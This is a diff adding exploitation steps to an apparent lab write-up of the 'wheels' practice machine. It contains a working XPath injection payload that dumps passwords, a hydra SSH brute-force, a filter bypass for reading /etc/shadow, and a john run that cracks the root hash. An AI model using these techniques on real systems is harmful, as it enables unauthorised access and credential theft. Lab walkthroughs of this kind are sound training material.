@@ -104,7 +104,122 @@ Now, we got an XML error. This looks like a potential XPATH injection
 
 <h2>Exploitation</h2>
 
-<font color="red">XPath injection is a type of cyber attack where an attacker inserts malicious code into a web application's XPath query. This can lead to unauthorized access, data theft, and other security breaches. The attacker can manipulate the query to access sensitive information or execute arbitrary commands. It is similar to SQL injection but targets XPath queries instead of SQL queries.</font>
+>XPath injection is a type of cyber attack where an attacker inserts malicious code into a web application's XPath query. This can lead to unauthorized access, data theft, and other security breaches. The attacker can manipulate the query to access sensitive information or execute arbitrary commands. It is similar to SQL injection but targets XPath queries instead of SQL queries.
+
+Now lets look for a payload that will help us harvest users passwords
+
+>payload used: %27)%5D/password%20%7C%20a%5Bcontains(a,%27
+
+![image](https://user-images.githubusercontent.com/67879936/222152476-d3a6d10d-851e-4316-93d1-afa0504ee302.png)
+
+Lets open this response in our browser
+
+![image](https://user-images.githubusercontent.com/67879936/222152682-cbf84433-fa44-4779-a110-24fc96be8ec3.png)
+
+Now, we got a bunch of passwords, earlier while we were snooping around the webpage I could recall we saw some usernames when we clicked on the search button
+
+![image](https://user-images.githubusercontent.com/67879936/222153084-3b278052-3dd1-4542-9d15-89fd638a0d0a.png)
+
+![image](https://user-images.githubusercontent.com/67879936/222153292-730e2c90-68bc-41f0-864e-dae01e068a35.png)
+
+What do we have so far??
+
+port 22 which runs ssh, bunch of usernames and also passwords.
+
+What comes to mind with these informations we've gathered so far??? Bruteforcing for ssh credentials using hydra hehe
+
+save the usernames and passwords in different files, then we use hydra to bruteforce ssh creds
+
+>command:hydra -L users.txt  -P passwords.txt ssh://192.168.82.202
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/wheels]
+└─$ hydra -L users.txt -P passwords.txt ssh://192.168.82.202 
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-01 14:39:55
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:6/p:6), ~3 tries per task
+[DATA] attacking ssh://192.168.82.202:22/
+[22][ssh] host: 192.168.82.202   login: bob   password: Iamrockinginmyroom1212
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-01 14:40:09
+```
+Alright, so we got the username and password for ssh login. Lets go ahead and login using these creds
+
+>command:ssh bob@192.168.82.202
+
+![image](https://user-images.githubusercontent.com/67879936/222156690-558d55be-2f25-48d1-be72-91620fe48268.png)
+
+Now that we are in lets go ahead and escalate our privileges
+
+
+<h2>Privilege Escalation</h2>
+
+Searching for suid files available on the machine, I found something interesting
+
+>command:find / -perm -u=s -type f 2>/dev/null
+
+![image](https://user-images.githubusercontent.com/67879936/222158397-52f50297-4c22-4716-8d9a-9901dac0a8ce.png)
+
+Going to the highlighted directory
+
+![image](https://user-images.githubusercontent.com/67879936/222159350-53fbe2b8-b2c9-4778-ae2a-e7cf9cd62a79.png)
+
+The file is an executable, lets go ahead and check what it does
+
+![image](https://user-images.githubusercontent.com/67879936/222160659-9d744b8a-2e1a-40ba-a4c4-e2da7e81dfcc.png)
+
+So, this executable gives us an option to choose the file to open, either the "customers" list or the "employees" list. If you input something different you get the "oops something went wrong" error
+
+Another thing this program does is that it filters out _&_ _;_ _|_ if these symbols are present the program immediately terminates. If they aren't present the program checks if the "employee" and "customers" options are available, if they aren't the program returns the "oops something went wrong" error
+
+To exploit this we'll be using the _#_ symbol to bypass the filters so that we can go ahead to read certain files
+
+![image](https://user-images.githubusercontent.com/67879936/222168410-4e7ed1da-4a3e-4885-a6d6-fc4e67351a76.png)
+
+cool, so now we can read the _/etc/passwd_ file. Lets try to read the  _/etc/shadow_ file also
+
+![image](https://user-images.githubusercontent.com/67879936/222169171-386efe12-f3da-4665-9776-fd49b20163d1.png)
+
+Now, that we can view the  _/etc/shadow_ file, we can go ahead to crack the hash. We'll be using John (my best buddy :)) to do crack this
+
+>command:john hash --wordlist=/home/bl4ck4non/Documents/rockyou.txt
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/wheels]
+└─$ nano hash     
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/wheels]
+└─$ cat hash           
+root:$6$Hk74of.if9klVVcS$EwLAljc7.DOnqZqVOTC0dTa0bRd2ZzyapjBnEN8tgDGrR9ceWViHVtu6gSR.L/WTG398zZCqQiX7DP/1db3MF0
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/wheels]
+└─$ john hash --wordlist=/home/bl4ck4non/Documents/rockyou.txt                                                                        
+Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
+Use the "--format=HMAC-SHA256" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+highschoolmusical (root)     
+1g 0:00:00:03 DONE (2023-03-01 15:33) 0.2777g/s 1848p/s 1848c/s 1848C/s horoscope..aditya
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+We got the root password, now lets go ahead and switch user to root
+
+![image](https://user-images.githubusercontent.com/67879936/222171372-7d85a5d1-e00b-4817-aa22-f121b3f229b2.png)
+
+Boom!!! We got the root shell
+
+That will be all for now
+
+
+
+
+
 
 
 
